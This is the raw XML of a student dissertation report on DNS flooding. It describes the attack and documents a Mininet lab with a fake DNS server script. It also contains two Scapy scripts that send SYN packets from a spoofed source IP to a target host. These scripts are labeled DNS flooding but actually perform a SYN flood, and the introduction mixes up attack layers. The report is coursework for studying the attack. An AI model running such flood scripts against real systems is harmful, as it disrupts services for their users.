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#ffffff" fo:color="#16161d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#ffffff" fo:color="#16161d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#ffffff" fo:color="#16161d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#ffffff" fo:color="#16161d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#ffffff" fo:color="#16161d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#ffffff" fo:color="#222222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0000ff"/>
    </style:style>
    <style:style style:name="T7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#ffffff" fo:color="#222222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0000ff"/>
    </style:style>
    <style:style style:name="T7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0000ff"/>
    </style:style>
    <style:style style:name="T8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70.90pt" fo:text-indent="35.45pt"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph">
      <style:paragraph-properties fo:line-height="120.00%" fo:text-align="left" fo:margin-left="106.35pt" fo:text-indent="0.00pt" fo:margin-bottom="6.00pt"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph">
      <style:paragraph-properties fo:line-height="120.00%" fo:text-align="left" fo:margin-left="106.35pt" fo:text-indent="35.45pt" fo:margin-bottom="6.00pt"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph">
      <style:paragraph-properties fo:line-height="120.00%" fo:text-align="left" fo:margin-left="35.45pt" fo:text-indent="35.45pt" fo:margin-bottom="6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36.00pt" fo:text-indent="36.00p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36.00pt" fo:text-indent="-27.00p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15.00%" fo:text-align="justify"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="justify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justify" fo:margin-left="36.00pt" fo:text-indent="0.00pt"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="justify" fo:margin-left="18.00pt" fo:text-indent="0.00p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 fo:margin-left="18.00pt" fo:text-indent="0.00pt"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="justify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/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="justify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18.00pt" fo:text-indent="0.00pt"/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justify" fo:margin-left="-18.00pt" fo:text-indent="18.00pt"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="justify" fo:margin-left="36.00pt" fo:text-indent="0.00p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justify" fo:margin-left="-18.00pt" fo:text-indent="18.00pt"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph">
      <style:paragraph-properties fo:line-height="105.00%" fo:text-align="justify" fo:margin-left="36.00pt" fo:text-indent="0.00pt" fo:margin-bottom="8.00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justify" fo:margin-left="-18.00pt" fo:text-indent="18.00pt"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph">
      <style:paragraph-properties fo:line-height="105.00%" fo:text-align="justify" fo:margin-left="36.00pt" fo:text-indent="0.00pt" fo:margin-bottom="8.00pt"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="justify" fo:margin-left="36.00pt" fo:text-indent="0.00pt"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="justify"/>
    </style:style>
  </office:automatic-styles>
  <office:body>
    <office:text>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ramaiah Institute of Technology</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T2">(An Autonomous Institute, Affiliated to VTU) </text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T2"><text:s text:c="3"/>MSR Nagar, MSRIT post, Bangalore-54</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T2"><text:s text:c="4"/>A Dissertation Report on</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T3"><text:s text:c="2"/><text:tab/><text:tab/><text:s text:c="5"/>DNS Flooding</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T3"><text:s/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T4">Submitted by</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T5"/></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T5"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T6"><text:tab/><text:tab/><text:s/></text:span><text:span text:style-name="T7"><text:s text:c="2"/>Vaibhav Srivastava<text:tab/><text:s text:c="2"/>1MS15CS135<text:s text:c="6"/>vaibhavsotwwttt@gmail.com</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T8"><text:s/></text:span><text:span text:style-name="T9"><text:s text:c="2"/>Arshad Ali Khan<text:tab/> 1MS15CS047<text:s text:c="2"/><text:tab/>arshukhanhm@gmail.com</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T10"><text:s/></text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T12">Bachelor of Engineering in Computer Science &amp; Engineering </text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T13"><text:tab/><text:tab/><text:tab/><text:s text:c="3"/></text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T13"><text:tab/> <text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P11"><draw:frame text:anchor-type="as-char" svg:width="26.46mm" svg:height="34.66mm" style:rel-width="scale" style:rel-height="scale"><draw:object-ole xlink:href="OleObj1"/><draw:image xlink:href="ObjectReplacements/OleObj1"/></draw:frame><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T15">DEPARTMENT OF COMPUTER SCIENCE &amp; ENGINEERING</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T15">M.S.RAMAIAH INSTITUTE OF TECHNOLOGY</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T15">(Autonomous Institute, Affiliated to VTU)</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T15">BANGALORE-560054</text:span></text:p>
      <text:p text:style-name="P11"><text:a xlink:href="http://www.msrit.edu/"><text:span text:style-name="T17">www.msrit.edu</text:span></text:a><text:span text:style-name="T18">,<text:s/></text:span><text:span text:style-name="T19">20177</text:span></text:p>
      <text:p text:style-name="P11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3"><text:span text:style-name="T21">Introduction</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T22"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">DNS flood is a type of Distributed Denial of Service (DDoS) attack in which the attacker</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">targets one or more Domain Name System (DNS) servers belonging to a given zone,</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">attempting to hamper resolution of resource records of that zone and its sub-zones.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">DNS servers helps requestors find the servers they seek.A DNS zone is a distinct portion</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">of the domain name space in the Domain Name System (DNS). For each zone,</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">administrative responsibility is delegated to a single server cluster.In a DNS flood attack</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">the offender tries to overbear a given DNS server with apparently valid traffic,</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">overwhelming server resources and impeding the servers ability to direct legitimate</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">requests to zone resources.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">DNS floods are symmetrical DDoS attacks. These attacks attempt to exhaust server-side</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">assets (e.g., memory or CPU) with a flood of UDP requests, generated by scripts running</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">on several compromised botnet machines.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">A DNS flood attack is considered a variant of the UDP flood attack, since DNS servers</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">rely on the UDP protocol for name resolution, and is a Layer 7 attack. With UDP-based</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">queries , a full circuit is never established, and spoofing is more easily accomplished.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">To attack a DNS server with a DNS flood, the attacker runs a script , generally from</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">multiple servers. These scripts send malformed packets from spoofed IP addresses. Since</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">Layer 7 attacks like DNS flood require no response to be effective, the attacker can send</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">packets that are neither accurate nor even correctly formatted.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">The attacker can spoof all packet information, including source IP and make it appear that</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">the attack is coming from multiple sources. Randomized packet data also helps offenders</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">to avoid common DDoS protection mechanisms, while also like IP filtering completely</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">useless.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">Another common type of DNS flood attack is DNS NXDOMAIN flood attack, in which</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">the attacker floods the DNS server with requests for records that are nonexistent or invalid.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">The DNS server expends all its resources looking for these records, its cache fills with bad</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">requests, and it eventually has no resources to serve legitimate requests.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">Large Layer 3 attacks like DNS floods are very difficult for on-premises solutions to</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">mitigate.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">Incapsula’s approach to mitigating DNS floods is simple and hassle-free. The solution is</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">enabled by a dedicated anti-DDoS 'DNS Protection' service. Using DNS Protection, clients</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">are able to deploy Incapsula's multi-datacenter network in front of their DNS authoritative</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T23">server</text:span><text:span text:style-name="T24">—</text:span><text:span text:style-name="T25">doing so without making any changes to their existing zone file settings.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T26">With the DNS Protection in place, Incapsula becomes the destination for all incoming</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T26">DNS queries, which are scrubbed on their way to their origin.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T26">Incapsula users can then continue to set their own custom thresholds, with different values</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T26">provided for the more likely-to-be-legitimate “safe” queries. In addition, users can also</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T26">manually enforce DNS freshens by electing to refresh all cached data or by selectively</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T27"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T28">refreshing specific DNS records.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T29"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T30">System Design</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T31"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T32">In this project, a tree topology is being created with two switches with each giving two hosts. </text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T33"/></text:p>
      <text:p text:style-name="P14"><draw:frame text:anchor-type="as-char" svg:width="175.68mm" svg:height="98.69mm" style:rel-width="scale" style:rel-height="scale"><draw:object-ole xlink:href="OleObj2"/><draw:image xlink:href="ObjectReplacements/OleObj2"/></draw:frame><text:span text:style-name="T33"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T34">Code(Different Modules Used)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T35"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T35"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T36">client1.py(Host 2 spoofing IP address of host 1)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T37"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T38">from scapy.all import *</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T38">def synFlood(src,tgt):</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T38"><text:s text:c="4"/>for sport in range(1024,1500):</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T38"><text:s text:c="8"/>L3=IP(src=src , dst=tgt)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T38"><text:s text:c="8"/>L4= TCP(sport=sport , dport=1337)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T38"><text:s text:c="8"/>pkt=L3/L4</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T38"><text:s text:c="8"/>send(pkt)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T38">for i in range(0,250):</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T38"><text:s text:c="4"/>src = "10.0.0.1"</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T38"><text:s text:c="4"/>i+=1</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T38"><text:s text:c="4"/>tgt = "10.0.0.4"</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T38"><text:s text:c="4"/>synFlood(src,tgt) </text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T39"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T40">client2.py(Host 3 spoofing IP address of host 1)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T41"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T42">from scapy.all import *</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T42">def synFlood(src,tgt):</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T42"><text:s text:c="4"/>for sport in range(1024,1500):</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T42"><text:s text:c="8"/>L3=IP(src=src , dst=tgt)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T42"><text:s text:c="8"/>L4= TCP(sport=sport , dport=1337)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T42"><text:s text:c="8"/>pkt=L3/L4</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T42"><text:s text:c="8"/>send(pkt)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T42">for i in range(0,250):</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T42"><text:s text:c="4"/>src = "10.0.0.1"</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T42"><text:s text:c="4"/>i+=1</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T42"><text:s text:c="4"/>tgt = "10.0.0.4"</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T42"><text:s text:c="4"/>synFlood(src,tgt) </text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T43"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T43"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T44">server.py(DNS server is set up at node 4)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T45"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T46">import socket</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T46">import optparse</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T46">import time</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T47"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T48">class DNSQuery:</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T48"><text:s text:c="2"/>def __init__(self, data):</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T48"><text:s text:c="4"/>self.data=data</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T48"><text:s text:c="4"/>self.dominio=''</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T48"><text:s text:c="4"/>self.DnsType=''</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T49"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T50"><text:s text:c="4"/>HDNS=data[-4:-2].encode("hex")</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T50"><text:s text:c="4"/>if HDNS == "0001":</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T50"><text:s text:c="6"/>self.DnsType='A'</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T50"><text:s text:c="4"/>elif HDNS == "000f":</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T50"><text:s text:c="6"/>self.DnsType='MX'</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T50"><text:s text:c="4"/>elif HDNS == "0002":</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T50"><text:s text:c="6"/>self.DnsType='NS'</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T50"><text:s text:c="4"/>elif HDNS == "0010":</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T50"><text:s text:c="7"/>self.DnsType="TXT"</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T50"><text:s text:c="4"/>else:</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T50"><text:s text:c="6"/>self.DnsType="Unknown"</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T51"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T52"><text:s text:c="4"/>tipo = (ord(data[2]) &gt;&gt; 3) &amp; 15<text:s text:c="3"/># Opcode bits</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T52"><text:s text:c="4"/>if tipo == 0:<text:s text:c="21"/># Standard query</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T52"><text:s text:c="6"/>ini=12</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T52"><text:s text:c="6"/>lon=ord(data[ini])</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T52"><text:s text:c="6"/>while lon != 0:</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T52"><text:s text:c="8"/>self.dominio+=data[ini+1:ini+lon+1]+'.'</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T52"><text:s text:c="8"/>ini+=lon+1</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T52"><text:s text:c="8"/>lon=ord(data[ini])</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T53"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T54"><text:s text:c="2"/>def respuesta(self, ip):</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T54"><text:s text:c="4"/>packet=''</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T54"><text:s text:c="4"/>if self.dominio:</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T54"><text:s text:c="6"/>packet+=self.data[:2] + "\x81\x80"</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T54"><text:s text:c="6"/>packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'<text:s text:c="3"/># Questions and Answers Counts</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T54"><text:s text:c="6"/>packet+=self.data[12:]<text:s text:c="41"/># Original Domain Name Question</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T54"><text:s text:c="6"/>packet+='\xc0\x0c'<text:s text:c="45"/># Pointer to domain name</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T54"><text:s text:c="6"/>packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'<text:s text:c="13"/># Response type, ttl and resource data length -&gt; 4 bytes</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T54"><text:s text:c="6"/>packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # 4bytes of IP</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T54"><text:s text:c="4"/>return packet</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T55"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56">if __name__ == '__main__':</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="2"/>parser = optparse.OptionParser()</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="2"/>parser.add_option("-f", "--filename", action="store", type="string",dest="SaveFile", help="input a filename to log output too")</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="2"/>(options, args) = parser.parse_args()</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="2"/></text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="2"/>ip='192.168.1.1'</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="2"/>print('pyminifakeDNS:: dom.query. 60 IN A %s' % ip)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="2"/></text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="2"/>udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="2"/>udps.bind(('',53))</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="2"/></text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="2"/>try:</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="4"/>while 1:</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="6"/>data, addr = udps.recvfrom(1024)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="6"/>p=DNSQuery(data)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="6"/>udps.sendto(p.respuesta(ip), addr)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="6"/>print( 'Respuesta: %s -&gt; %s -&gt; %s -&gt; %s' % (addr[0], p.DnsType, p.dominio, ip))</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="6"/>if options.SaveFile:</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="8"/>MyDate=time.strftime('%Y %m %d')</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="8"/>MyTime=time.strftime('%H:%M:%S')</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="8"/>logfile = open(options.SaveFile,"a")</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="8"/>logfile.write('%s,%s,%s,%s,%s,%s\n' % (MyDate,MyTime,addr[0], p.DnsType,p.dominio,ip))</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="8"/>logfile.close </text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="2"/>except KeyboardInterrupt:</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56"><text:s text:c="4"/>print ('Finalizando')</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T56">udps.close()</text:span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4"><text:span text:style-name="T58">Implementation</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T59"/></text:p>
      <text:list text:style-name="L16">
        <text:list-item>
          <text:p text:style-name="P16"><text:span text:style-name="T60">Open Mininet and use the sudo mn command to create a simple topology which consists of 4 hosts.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P17"><text:span text:style-name="T61"/></text:p>
      <text:p text:style-name="P18"><draw:frame text:anchor-type="as-char" svg:width="165.10mm" svg:height="92.87mm" style:rel-width="scale" style:rel-height="scale"><draw:object-ole xlink:href="OleObj3"/><draw:image xlink:href="ObjectReplacements/OleObj3"/></draw:frame><text:span text:style-name="T61"/></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T61"/></text:p>
      <text:list text:style-name="L19">
        <text:list-item>
          <text:p text:style-name="P19"><text:span text:style-name="T62">Type the command xterm h1/h2/h3/h4 to open a seperate terminal for the four hosts created.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P19"><text:span text:style-name="T62">For node 4,run the python code which sets up the DNS server.Node 4 is made to be the server and all the TCP requests are directed to this server.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P20"><draw:frame text:anchor-type="as-char" svg:width="147.90mm" svg:height="87.84mm" style:rel-width="scale" style:rel-height="scale"><draw:object-ole xlink:href="OleObj4"/><draw:image xlink:href="ObjectReplacements/OleObj4"/></draw:frame><text:span text:style-name="T63"/></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T63"/></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="T63"/></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="T63"/></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="T63"/></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="T63"/></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="T63"/></text:p>
      <text:list text:style-name="L22">
        <text:list-item>
          <text:p text:style-name="P22"><text:span text:style-name="T64">Now for node h2 and h3 spoof the IP address of host h1 so that server sees it as all requests are coming from host h1.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P23"><draw:frame text:anchor-type="as-char" svg:width="161.13mm" svg:height="106.10mm" style:rel-width="scale" style:rel-height="scale"><draw:object-ole xlink:href="OleObj5"/><draw:image xlink:href="ObjectReplacements/OleObj5"/></draw:frame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p text:style-name="P23"><text:span text:style-name="T65"/></text:p>
      <text:list text:style-name="L24">
        <text:list-item>
          <text:p text:style-name="P24"><text:span text:style-name="T66">Set up wireshark in the host h1 and start capturing packets and we can see the flooding.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P25"><text:span text:style-name="T67"/></text:p>
      <text:p text:style-name="P25"><text:span text:style-name="T67"/></text:p>
      <text:p text:style-name="P25"><text:span text:style-name="T67"/></text:p>
      <text:p text:style-name="P25"><text:span text:style-name="T67"/></text:p>
      <text:p text:style-name="P25"><draw:frame text:anchor-type="as-char" svg:width="165.10mm" svg:height="92.87mm" style:rel-width="scale" style:rel-height="scale"><draw:object-ole xlink:href="OleObj6"/><draw:image xlink:href="ObjectReplacements/OleObj6"/></draw:frame><text:span text:style-name="T67"/></text:p>
      <text:p text:style-name="P25"><text:span text:style-name="T67"/></text:p>
      <text:p text:style-name="P25"><text:span text:style-name="T67"/></text:p>
      <text:p text:style-name="P25"><text:span text:style-name="T67"/></text:p>
      <text:p text:style-name="P25"><draw:frame text:anchor-type="as-char" svg:width="165.10mm" svg:height="92.87mm" style:rel-width="scale" style:rel-height="scale"><draw:object-ole xlink:href="OleObj7"/><draw:image xlink:href="ObjectReplacements/OleObj7"/></draw:frame><draw:frame text:anchor-type="as-char" svg:width="157.43mm" svg:height="93.40mm" style:rel-width="scale" style:rel-height="scale"><draw:object-ole xlink:href="OleObj8"/><draw:image xlink:href="ObjectReplacements/OleObj8"/></draw:frame><text:span text:style-name="T67"/></text:p>
      <text:p text:style-name="P25"><text:span text:style-name="T67"/></text:p>
      <text:p text:style-name="P25"><text:span text:style-name="T67"/></text:p>
      <text:p text:style-name="P25"><text:span text:style-name="T68"><text:s text:c="49"/></text:span><text:span text:style-name="T69"><text:s/>I/O Graph</text:span></text:p>
      <text:p text:style-name="P25"><text:span text:style-name="T70"/></text:p>
      <text:p text:style-name="P25"><text:span text:style-name="T70"/></text:p>
      <text:p text:style-name="P26"><text:span text:style-name="T70"/></text:p>
      <text:p text:style-name="P27"><text:span text:style-name="T70"/></text:p>
      <text:p text:style-name="P27"><text:span text:style-name="T70"/></text:p>
      <text:p text:style-name="P27"><text:span text:style-name="T71">References</text:span></text:p>
      <text:p text:style-name="P27"><text:span text:style-name="T72"/></text:p>
      <text:list text:style-name="L28">
        <text:list-item>
          <text:p text:style-name="P28"><text:span text:style-name="T73"> </text:span><text:a xlink:href="https://www.incapsula.com/ddos/attack-glossary/dns-flood.html"><text:span text:style-name="T74">https://www.incapsula.com/ddos/attack-glossary/dns-flood.html</text:span></text:a><text:span text:style-name="T75"/></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P29"><text:span text:style-name="T76"/></text:p>
      <text:list text:style-name="L30">
        <text:list-item>
          <text:p text:style-name="P30"><text:span text:style-name="T77"> </text:span><text:a xlink:href="https://www.youtube.com/watch?v=RH7dIN97aRc"><text:span text:style-name="T78">https://www.youtube.com/watch?v=RH7dIN97aRc</text:span></text:a><text:span text:style-name="T79"/></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P31"><text:span text:style-name="T80"/></text:p>
      <text:list text:style-name="L32">
        <text:list-item>
